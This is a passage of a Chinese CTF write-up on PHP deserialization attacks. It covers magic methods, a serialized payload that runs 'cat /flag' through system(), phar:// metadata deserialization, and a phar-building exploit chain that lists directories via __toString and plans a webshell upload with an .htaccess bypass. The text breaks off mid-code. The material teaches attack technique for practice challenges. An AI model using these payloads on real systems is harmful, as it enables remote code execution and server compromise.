invoke__">__debugInfo</span>()等方法</span><br><span class="line">在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</span><br></pre></td></tr></table></figure><p>注意:所有的魔术方法 必须声明为public</p><p>警告:<br>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。<br>在php反序列化利用中常常用到一下这些魔术方法</p><p>常用魔术方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>() <span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//在对象被序列化之前运行</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//在对象被反序列化之后被调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//当要调用的方法不存在或权限不足时自动调用</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//需要调用私有属性时自动调用</span></span><br></pre></td></tr></table></figure><h2 id="反序列化漏洞的逻辑？"><a href="#反序列化漏洞的逻辑？" class="headerlink" title="反序列化漏洞的逻辑？"></a>反序列化漏洞的逻辑？</h2><p>PHP反序列化漏洞又称PHP对象注入,主要成因就是在处理反序列化数据中处理不当导致的危险代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[NPUCTF2020]ReadlezPHP</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>类_HelloPhp_拥有两个魔术方法,在__destruct方法中,使用成员变量$a作为参数$b作为变量函数名执行代码</p><p>在代码最后接收GET参数并进行反序列化</p><p>这道题很简单,我们只需要通过构造$a与$b组成危险代码,然后构造HelloPhp类的序列化对象即可</p><p>构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">#输出:   O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;cat /flag&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>把输出结果当多GET[‘data’]，反序列化结束后，当对象销毁的时候，触发__destruct，进而执行命令。<br>大量引用（侵删，逃。）：</p><p><a href="https://www.freebuf.com/articles/web/264740.html">详谈CTF中常出现的PHP反序列化漏洞</a></p><h2 id="什么是phar？"><a href="#什么是phar？" class="headerlink" title="什么是phar？"></a>什么是phar？</h2><p>Phar (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。如果你使用的是 PHP 5.3 或更高版本，那么Phar后缀文件是默认开启支持的，你不需要任何其他的安装就可以使用它。而Phar文件中也存在反序列化的利用点:phar文件会以序列化的形式储存用户自定义的meta-data,在执行Phar文件时meta-data中用户自定义的元数据将被反序列化从而达到反序列化攻击的目的,这也扩展了PHP反序列化攻击的攻击面</p><p>这一利用出自2018年Blackhat大会上的Sam Thomas分享的File Operation Induced Unserialization via the「phar:&#x2F;&#x2F;」Stream Wrapper这个议题，具体可以看这里<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">【传送门】</a>。(From Freebuff)</p><p>该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar:&#x2F;&#x2F;伪协议，可以<br>不依赖unserialize()直接进行反序列化操作。<br>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。<br>demo:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">#phar_gen.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$b</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>受影响的函数:</p><p><img src="https://image.3001.net/images/20210301/1614589832_603caf8863af0433734dd.jpg!small"></p><h2 id="正式解题"><a href="#正式解题" class="headerlink" title="正式解题"></a>正式解题</h2><p>有了上面的背景知识，我们就可分析程序逻辑，寻找漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$filename</span></span>) </span>&#123;<span class="comment">//构造</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userdir = <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename  =  <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable language_">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable language_">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span>(<span class="params"></span>)</span>&#123;<span class="comment">//检查dir是否伪造</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;userdir != <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span>(<span class="params"></span>)</span>&#123;<span class="comment">//检查url是否有基本的协议</span></span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable language_">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|php/i&quot;</span>,<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span>(<span class="params"></span>)</span>&#123;<span class="comment">//检查filename是否目录穿越</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable language_">$this</span>-&gt;filename,<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable language_">$this</span>-&gt;filename,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;filename, <span class="title function_ invoke__">strrpos</span>(<span class="variable language_">$this</span>-&gt;filename, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;<span class="comment">//检查content里是否涉及有黑名单</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkurl</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;url,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;filename,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;<span class="comment">//删除</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable language_">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable language_">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;<span class="comment">//文件数</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable language_">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you have <span class="subst">$num</span> files&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you don&#x27;t have file&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;<span class="comment">//被当作字符串时触发</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="title function_ invoke__">scandir</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//解构触发</span></span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : a&quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="title class_">dir</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;count&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体逻辑，实现了给一个url获取内容，写入filename，并提示写入了userdir，但这里就有个奇怪的点，既然userdir会被检查，那么tostring就显得有些奇怪。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;<span class="comment">//被当作字符串时触发</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="title function_ invoke__">scandir</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//解构触发</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="string">&quot;your file in : a&quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到，如果我们能触发tostring，就可以返回userdir下的目录。并且结构函数可以输出userdir，那么我们要想看到目录信息，怎么办？我们想到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;userdir=<span class="string">&quot;../&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;userdir=<span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>当解构b时，会拼接$b-&gt;userdir，把a当作字符串<br>即可触发a的tostring，即返回“..”即上级目录，进而打印出来，并且保存到filename里。这里怎么触发解构呢？<br>又没有反序列化函数，所以我们就想到了phar，我们可以看到upload方法可以上传phar文件，进而我们也利用该方法，读取我们上传的phar文件，进而触发反序列化漏洞</p><p>所以我们的思路就是上传木马文件名文件，再上传phar，引用该phar，触发tostring，输出我们想要的目录到filename，访问该filename，进而getshell（因为过滤了ph*文件，我们可以用.htaccess 扩大类型利用范围）</p><h3 id="第一步，上传木马文件名"><a href="#第一步，上传木马文件名" class="headerlink" title="第一步，上传木马文件名"></a>第一步，上传木马文件名</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post data</span><br><span class="line">action=upload&amp;url=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F1234&amp;filename=<span class="meta">&lt;?php</span> 一句话<span class="meta">?&gt;</span>.txt&amp;dir=</span><br></pre></td></tr></table></figure><h3 id="第二部，构造phar输出目标目录"><a href="#第二部，构造phar输出目标目录" class="headerlink" title="第二部，构造phar输出目标目录"></a>第二部，构造phar输出目标目录</h3><h4 id="准备上传uppwd-par，用于查看上级目录"><a href="#准备上传uppwd-par，用于查看上级目录" class="headerlink" title="准备上传uppwd.par，用于查看上级目录"></a>准备上传uppwd.par，用于查看上级目录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;uppwd.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;    __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;../&#x27;</span>;<span class="comment">//输出上级目录，这个为什么，因为我们最后一步把木马文件名输入到filename的时候，需要绝对路径，所以上级目录也是需要的</span></span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 